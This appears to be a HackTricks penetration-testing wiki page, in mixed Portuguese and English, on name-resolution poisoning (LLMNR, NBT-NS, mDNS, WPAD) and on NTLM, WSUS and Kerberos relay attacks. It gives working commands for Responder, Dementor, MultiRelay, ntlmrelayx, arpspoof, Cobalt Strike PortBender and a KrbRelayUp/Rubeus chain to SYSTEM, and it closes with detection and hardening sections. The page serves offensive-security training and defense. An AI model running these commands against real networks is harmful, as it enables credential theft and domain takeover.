# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft and outros sistemas operacionais usam LLMNR e NBT-NS para resolução de nomes locais quando o DNS falha. De forma semelhante, sistemas Apple e Linux usam mDNS.
- Esses protocolos são suscetíveis à interceptação e spoofing devido à sua natureza não autenticada e broadcast sobre UDP.
- [Responder](https://github.com/lgandx/Responder) e [Dementor](https://github.com/MatrixEditor/Dementor) podem ser usados para se passar por serviços enviando respostas forjadas para hosts que consultam esses protocolos.
- Mais informações sobre impersonação de serviços usando Responder podem ser encontradas [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD permite que navegadores descubram automaticamente as configurações de proxy.
- A descoberta é facilitada via DHCP, DNS, ou fallback para LLMNR e NBT-NS se o DNS falhar.
- Responder pode automatizar ataques WPAD, direcionando clientes para servidores WPAD maliciosos.

### Responder/Dementor for Protocol Poisoning

- **Responder** é uma ferramenta usada para envenenar consultas LLMNR, NBT-NS e mDNS, respondendo seletivamente com base nos tipos de consulta, focando principalmente em serviços SMB.
- Vem pré-instalado no Kali Linux, configurável em `/etc/responder/Responder.conf`.
- Responder exibe hashes capturados na tela e os salva no diretório `/usr/share/responder/logs`.
- Suporta tanto IPv4 quanto IPv6.
- Versão Windows do Responder disponível [here](https://github.com/lgandx/Responder-Windows).

- **Dementor** amplia os tópicos de multicast poisoning e adicionalmente atua como um provedor de serviços rogue (incluindo suporte a CUPS RCE).
- A estrutura geral é semelhante à do **Responder** com configuração mais granular. (padrão está aqui: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Compatibilidade entre **Dementor** e **Responder** disponível aqui: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Introdução e documentação aqui: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Corrige problemas de captura introduzidos pelo Responder em certos protocolos

#### Running Responder

- To run Responder with default settings: `responder -I <Interface>`
- For more aggressive probing (with potential side effects): `responder -I <Interface> -P -r -v`
- Techniques to capture NTLMv1 challenges/responses for easier cracking: `responder -I <Interface> --lm --disable-ess`
- WPAD impersonation can be activated with: `responder -I <Interface> --wpad`
- NetBIOS requests can be resolved to the attacker's IP, and an authentication proxy can be set up: `responder.py -I <interface> -Pv`

#### Running Dementor

- With detault settings applied: `Dementor -I <interface>`
- With default settings in analysis mode: `Dementor -I <interface> -A`
- Automatic NTLM session downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Run current session with custom config: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing DHCP responses pode envenenar permanentemente as informações de roteamento de uma vítima, oferecendo uma alternativa mais furtiva ao ARP poisoning.
- Requer conhecimento preciso da configuração da rede alvo.
- Executando o ataque: `./Responder.py -I eth0 -Pdv`
- Esse método pode capturar efetivamente hashes NTLMv1/2, mas requer cuidado para evitar interrupção da rede.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor irão se passar por serviços usando os protocolos mencionados acima, capturando credenciais (normalmente NTLMv2 Challenge/Response) quando um usuário tenta autenticar contra os serviços spoofed.
- Podem ser feitas tentativas de downgrade para NetNTLMv1 ou desativar ESS para facilitar a quebra das credenciais.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

É crucial notar que empregar essas técnicas deve ser feito de forma legal e ética, garantindo autorização adequada e evitando interrupções ou acesso não autorizado.

## Inveigh

Inveigh é uma ferramenta para penetration testers e red teamers, projetada para sistemas Windows. Oferece funcionalidades similares ao Responder, realizando spoofing e ataques man-in-the-middle. A ferramenta evoluiu de um script PowerShell para um binário C#, com [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) e [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) como as versões principais. Parâmetros detalhados e instruções podem ser encontrados no [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh can be operated through PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou executado como um binário em C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

This attack leverages SMB authentication sessions to access a target machine, granting a system shell if successful. Key prerequisites include:

- O usuário que se autentica deve ter acesso Local Admin no relayed host.
- SMB signing deve estar desabilitado.

#### 445 Port Forwarding and Tunneling

Em cenários onde a introdução direta na rede não é viável, o tráfego na porta 445 precisa ser encaminhado e tunelado. Ferramentas como [**PortBender**](https://github.com/praetorian-inc/PortBender) ajudam a redirecionar o tráfego da porta 445 para outra porta, o que é essencial quando há acesso Local Admin para carregamento de drivers.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Outras Ferramentas para NTLM Relay Attack

- **Metasploit**: Configurado com proxies e detalhes do host local e remoto.
- **smbrelayx**: Um script Python para encaminhar sessões SMB e executar comandos ou implantar backdoors.
- **MultiRelay**: Uma ferramenta da suíte Responder para relay de usuários específicos ou de todos os usuários, executar comandos ou dump hashes.

Cada ferramenta pode ser configurada para operar através de um SOCKS proxy, se necessário, permitindo ataques mesmo com acesso de rede indireto.

### Operação do MultiRelay

MultiRelay é executado a partir do diretório _**/usr/share/responder/tools**_, visando IPs ou usuários específicos.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
These tools and techniques form a comprehensive set for conducting NTLM Relay attacks in various network environments.

### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

Clients WSUS autenticam-se ao seu servidor de update usando NTLM sobre HTTP (8530) ou HTTPS (8531). Quando HTTP está habilitado, check-ins periódicos dos clientes podem ser coagidos ou interceptados no segmento local e relayados com ntlmrelayx para endpoints LDAP/LDAPS/SMB ou AD CS HTTP (ESC8) sem quebrar hashes. Isso se mistura ao tráfego normal de update e frequentemente resulta em autenticações de contas de máquina (HOST$).

What to look for
- Configuração de GPO/registro em HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate e ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints usados pelos clientes via HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Unauthenticated
- Escanear por serviços ouvindo: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Capturar tráfego HTTP WSUS via L2 MITM e logar clientes/endpoints ativos com wsusniff.py (HTTP apenas, a menos que você consiga fazer os clientes confiarem no seu TLS cert).
- Authenticated
- Fazer parse de SYSVOL GPOs em busca de chaves WSUS com MANSPIDER + regpol (o wrapper wsuspider.sh resume WUServer/WUStatusServer/UseWUServer).
- Consultar endpoints em escala a partir de hosts (NetExec) ou localmente:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Posicione-se para MITM (mesmo L2) de modo que um cliente resolva o servidor WSUS para você (ARP/DNS poisoning, Bettercap, mitm6, etc.). Exemplo com arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Redirecione a porta 8530 para seu listener de relay (opcional, conveniente):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Inicie ntlmrelayx com o listener HTTP (requer suporte do Impacket para HTTP listener; veja os PRs abaixo):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Outros alvos comuns:
- Relay para SMB (se signing desligado) para exec/dump: -t smb://<host>
- Relay para LDAPS para alterações de diretório (e.g., RBCD): -t ldaps://<DC>
- Relay para AD CS web enrollment (ESC8) para emitir um cert e então autenticar via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Para caminhos de abuso mais profundos do AD CS e tooling, veja a página AD CS:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Dispare um check-in do cliente ou espere pelo agendamento. Do cliente:
wuauclt.exe /detectnow
ou use a UI do Windows Update (Check for updates).

5) Use as sessões SOCKS autenticadas (se -socks) ou os resultados diretos do relay para pós-exploração (alterações LDAP, operações SMB, ou emissão de certificados AD CS para autenticação posterior).

HTTPS constraint (8531)
- Interceptação passiva do WSUS sobre HTTPS é ineficaz a menos que os clientes confiem no seu certificado. Sem um cert confiável ou outra quebra de TLS, o handshake NTLM não pode ser capturado/relayado a partir do tráfego WSUS HTTPS.

Notes
- WSUS foi anunciado como deprecated mas continua amplamente implantado; HTTP (8530) ainda é comum em muitos ambientes.
- Helpers úteis: wsusniff.py (observar check-ins WSUS HTTP), wsuspider.sh (enumerar WUServer/WUStatusServer a partir de GPOs), NetExec reg-query em escala.
- Impacket restaurou suporte ao HTTP listener para ntlmrelayx no PR #2034 (originalmente adicionado no PR #913).

### Force NTLM Logins

No Windows você pode ser capaz de forçar algumas contas privilegiadas a autenticarem-se em máquinas arbitrárias. Leia a página seguinte para aprender como:

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** rouba um **AP-REQ ticket** de um serviço e o reutiliza contra um segundo serviço que compartilha a **mesma chave de conta de máquina** (porque ambos os SPNs estão na mesma conta de máquina com `$`). Isso funciona mesmo que as **classes de serviço dos SPNs diferem** (e.g. `CIFS/` → `LDAP/`) porque a chave que decripta o ticket é o NT hash da máquina, não a string do SPN em si, e a string SPN não faz parte da assinatura.

Ao contrário do NTLM relay, o salto é limitado ao *mesmo host* mas, se você direcionar um protocolo que permita escrever no LDAP, você pode encadear em **Resource-Based Constrained Delegation (RBCD)** ou **AD CS enrollment** e alcançar **NT AUTHORITY\SYSTEM** em um único tiro.

Para informações detalhadas sobre este ataque, confira:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Conceitos básicos do Kerberos**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Proves the user to the KDC | untouched |
| **Service ticket / TGS-REQ ↔ REP** | Bound to one **SPN**; encrypted with the SPN owner’s key | interchangeable if SPNs share account |
| **AP-REQ** | Client sends `TGS` to the service | **what we steal & replay** |

* Tickets são criptografados com a **senha-derivada da chave da conta que possui o SPN**.
* O **Authenticator** dentro do AP-REQ tem um timestamp de 5 minutos; replay dentro dessa janela é válido até que o cache do serviço veja um duplicado.
* O Windows raramente verifica se a string do SPN no ticket bate com o serviço que você atingiu, então um ticket para `CIFS/HOST` normalmente decripta bem em `LDAP/HOST`.

- 2. **O que precisa ser verdadeiro para realizar um Kerberos relay**

1. **Shared key:** SPNs de origem e destino pertencem à mesma conta de máquina (padrão em servidores Windows).
2. **No channel protection:** SMB/LDAP signing desativado e EPA desligado para HTTP/LDAPS.
3. **Você pode interceptar ou coagir autenticação:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Fonte do ticket não ter sido usada:** você vence a corrida antes do pacote legítimo chegar ou o bloqueia completamente; caso contrário o cache de replay do servidor gera o Event 4649.
5. Você precisa de alguma forma ser capaz de realizar um **MitM na comunicação** — talvez sendo parte do grupo DNSAmins para modificar o DNS do domínio ou sendo capaz de alterar o HOST file da vítima.

### Kerberos Relay Steps

- 3.1 **Reconhecimento do host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Inicie o listener de relay**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` encapsula **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** em um único binário.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce faz o DC enviar um ticket Kerberos `CIFS/DC01` para nós.

- 3.4 **Relay the AP-REQ**

KrbRelay extrai o blob GSS do SMB, reembala-o em um LDAP bind, e o encaminha para `ldap://DC01`—a autenticação tem sucesso porque a **mesma chave** o descriptografa.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Você agora possui **NT AUTHORITY\SYSTEM**.


### **More paths worth knowing**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Servidor falso envia um **GSS-ID payload** com qualquer SPN; o cliente constrói um AP-REQ direto para você | Funciona mesmo entre sub-redes; credenciais de máquina por padrão |
| **DCOM / MSRPC** | Malicious OXID resolver força o cliente a autenticar para um SPN e porta arbitrários | Priv-esc *local* puro; contorna firewall |
| **AD CS Web Enroll** | Relay do ticket da máquina para `HTTP/CA` e obtenha um certificado, então **PKINIT** para mintar TGTs | Contorna defesas de LDAP signing |
| **Shadow Credentials** | Escreva `msDS-KeyCredentialLink`, depois PKINIT com par de chaves forjado | Não é necessário adicionar uma conta de computador |

### **Troubleshooting**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Chave do ticket ≠ chave do alvo | Host/SPN errado |
| `KRB_AP_ERR_SKEW` | Relógio com desvio > 5 min | Sincronize o tempo ou use `w32tm` |
| LDAP bind fails | Assinatura obrigatória | Use o caminho AD CS ou desative a assinatura |
| Event 4649 spam | Serviço detectou Authenticator duplicado | bloqueie ou race o pacote original |


### **Detection**

* Aumento repentino em **Event 4769** para `CIFS/`, `HTTP/`, `LDAP/` vindo da mesma fonte em segundos.
* **Event 4649** no serviço indica replay detectado.
* Logon Kerberos a partir de **127.0.0.1** (relay para SCM local) é altamente suspeito — mapeie via regra Sigma nos docs do KrbRelayUp.
* Fique de olho em alterações nos atributos `msDS-AllowedToActOnBehalfOfOtherIdentity` ou `msDS-KeyCredentialLink`.

## **Hardening**

1. **Enforce LDAP & SMB signing + EPA** em todos os servidores.
2. **Split SPNs** para que HTTP não esteja na mesma conta que CIFS/LDAP.
3. Corrija vetores de coerção (PetitPotam KB5005413, DFS, AuthIP).
4. Defina **`ms-DS-MachineAccountQuota = 0`** para impedir junções de computadores maliciosos.
5. Alarme em **Event 4649** e logons Kerberos de loopback inesperados.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
